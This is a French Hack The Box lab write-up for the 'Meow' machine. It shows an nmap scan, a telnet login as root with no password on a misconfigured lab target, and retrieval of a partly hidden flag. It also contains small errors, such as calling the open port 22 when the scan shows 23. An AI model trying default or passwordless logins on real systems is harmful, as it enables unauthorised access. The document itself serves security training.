---
title: "Meow"
date: 2025-11-17
description: "Comment utiliser une mauvaise configuration Telnet."
draft: false

# Tes taxonomies (correspondant à ton hugo.toml)
tags: ["Misconfiguration", "Protocol","Nmap", "Telnet", "Linux"]
categories: ["Writeups", "Hack The Box", "Starting Point"]
---

# Introduction

**Meow** est la première box du parcours *Starting Point* de Hack The Box. C’est une machine très simple, idéale pour débuter. Un walkthrough officiel existe déjà sur HTB si vous voulez un guide pas à pas.

>[!NOTE]
>**Note Importante :** Dans ce walkthrough, j’anonymise l’IP cible par `99.99.99.99` par précaution. Ce n’est pas absolument nécessaire, mais je préfère éviter d’exposer une IP réelle.

>[!CAUTION]
>**Rappel :** N’attaquez que des machines sur lesquelles vous avez l’autorisation (ex. machines HTB, ou lab perso). Respectez les règles de la plateforme.

>[!WARNING]
>Je ne publie pas directement le flag final dans ce guide, l’objectif est d’apprendre en pratiquant. Si vous voulez le flag, suivez les étapes sur la machine !

## Vidéo Walkthrough

Si tu préfères regarder un tuto plutôt que lire, voici ma vidéo :

{{< youtubeLite id="RGixHuuqmsI" label="Meow Walkthrough" >}}

---

## Reconnaissance (Information gathering)

### Découverte d’hôte (Asset discovery)

La première étape est de vérifier que la machine répond avec la commande `ping` suivi de l’**IP** de la cible. Cela permet de confirmer la connectivité réseau.

```bash
┌──(kali㉿kali)-[~]
└─$ ping 99.99.99.99

PING 99.99.99.99 (99.99.99.99) 56(84) bytes of data.
64 bytes from 99.99.99.99: icmp_seq=1 ttl=63 time=12.3 ms
64 bytes from 99.99.99.99: icmp_seq=2 ttl=63 time=12.5 ms
64 bytes from 99.99.99.99: icmp_seq=3 ttl=63 time=12.9 ms
64 bytes from 99.99.99.99: icmp_seq=4 ttl=63 time=156 ms
^C
--- 99.99.99.99 ping statistics ---
4 packets transmitted, 4 received, 0% packet loss, time 3005ms
rtt min/avg/max/mdev = 12.332/48.529/156.335/62.241 msbashshe
```
Quand on obtient des réponses, on peut interrompre la commande avec `CTRL+C`. Les 4 paquets que nous avons reçue en réponse nous indique bien que la cible est joignable.

### Découverte d’hôte (Asset discovery)

On va scanner les ports pour connaître les services accessibles et leurs versions. `namp` est l’outil standard pour ça. J’utilise le flag `-sV` pour la détection de version.

```bash
┌──(kali㉿kali)-[~]
└─$ sudo nmap -sV 99.99.99.99

Starting Nmap 7.95 ( https://nmap.org ) at 2025-11-01 15:47 EDT
Nmap scan report for 99.99.99.99
Host is up (0.067s latency).
Not shown: 999 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
23/tcp open  telnet  Linux telnetd
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 11.57 seconds
```

On voit qu’un seul port est ouvert, le port **22/tcp**. Et le service qui tourne dessus est **telnet**. **telnet** est un service d’administration à distance non chiffré. Sur des machines mal configurées, il peut accepter des connexions sans mot de passe ou avec des identifiants par défaut.

---

## Pré-Exploitation

### Evaluation de vulnerabilités (Vulnerability assessment)

Avant d’exploiter quoi que ce soit, on vérifie si une connexion interactive est possible. Ici, on va essayer `telnet 99.99.99.99` pour voir l’écran d’accueil et éventuellement un prompt de login.

```bash
──(kali㉿kali)-[~]
└─$ telnet 99.99.99.99

Trying 99.99.99.99...
Connected to 99.99.99.99.
Escape character is '^]'.

  █  █         ▐▌     ▄█▄ █          ▄▄▄▄
  █▄▄█ ▀▀█ █▀▀ ▐▌▄▀    █  █▀█ █▀█    █▌▄█ ▄▀▀▄ ▀▄▀
  █  █ █▄█ █▄▄ ▐█▀▄    █  █ █ █▄▄    █▌▄█ ▀▄▄▀ █▀█


Meow login: 
```

Le service demande un login, c’est un bon signe pour l’accès interactif. On va essayer des identifiants courants ou des comptes sans mot de passe.

---

## Exploitation

### Accès initial

On teste des comptes usuels sans mot de passe (admin, root, etc.).

```bash
──(kali㉿kali)-[~]
└─$ telnet 99.99.99.99

Trying 99.99.99.99...
Connected to 99.99.99.99.
Escape character is '^]'.

  █  █         ▐▌     ▄█▄ █          ▄▄▄▄
  █▄▄█ ▀▀█ █▀▀ ▐▌▄▀    █  █▀█ █▀█    █▌▄█ ▄▀▀▄ ▀▄▀
  █  █ █▄█ █▄▄ ▐█▀▄    █  █ █ █▄▄    █▌▄█ ▀▄▄▀ █▀█


Meow login: admin
Password: 

Login incorrect
Meow login: root
Welcome to Ubuntu 20.04.2 LTS (GNU/Linux 5.4.0-77-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

  System information as of Sat 01 Nov 2025 08:08:22 PM UTC

  System load:           0.0
  Usage of /:            41.7% of 7.75GB
  Memory usage:          4%
  Swap usage:            0%
  Processes:             134
  Users logged in:       0
  IPv4 address for eth0: 99.99.99.99
  IPv6 address for eth0: dead:beef::250:56ff:fe94:fdf1

 * Super-optimized for small spaces - read how we shrank the memory
   footprint of MicroK8s to make it the smallest full K8s around.

   https://ubuntu.com/blog/microk8s-memory-optimisation

75 updates can be applied immediately.
31 of these updates are standard security updates.
To see these additional updates run: apt list --upgradable


The list of available updates is more than a week old.
To check for new updates run: sudo apt update
Failed to connect to https://changelogs.ubuntu.com/meta-release-lts. Check your Internet connection or proxy settings


Last login: Sat Nov  1 19:36:36 UTC 2025 on pts/0
```

Sur Meow, la connexion **admin** échoue mais **root** passe sans mot de passe cela montre une mauvaise configuration (compte root sans mot de passe).

### Post-Exploitation
Après s’être connecté en tant que **root**, vérifiez quelques informations système utiles : noyau, utilisateur courant, etc.

Deux commande intéressante pour ça sont ``uname -a`` et ``whoami`` qui vont permettre de donner des infos sur la machine en elle même, et sur l’utilisateur.

````bash
root@Meow:~# uname -a
Linux Meow 5.4.0-77-generic #86-Ubuntu SMP Thu Jun 17 02:35:03 UTC 2021 x86_64 x86_64 x86_64 GNU/Linux

root@Meow:~# whoami
root
````

On peut maintenant faire un ``ls`` pour voir ce qu’il y a comme fichier ou dossier intéressant.

````bash
root@Meow:~# ls
flag.txt  snap
````

OH ! un fichier **flag.txt**, ouvrons le avec ``cat``

````bash
root@Meow:~# cat flag.txt 

b40{...hidden..}c19
````
On a enfin le flag, la machine est pwned!

---

## Pour aller plus loin

### Script automatisé
J'ai fait un script python qui permet de craquer automatiquement la box Meow

{{< github repo="ravenbreach/Meow_Automated" showThumbnail=true >}}

### Rapport professionnel
Ce n'est pas encore fait mais je prévois de faire un rapport professionnel !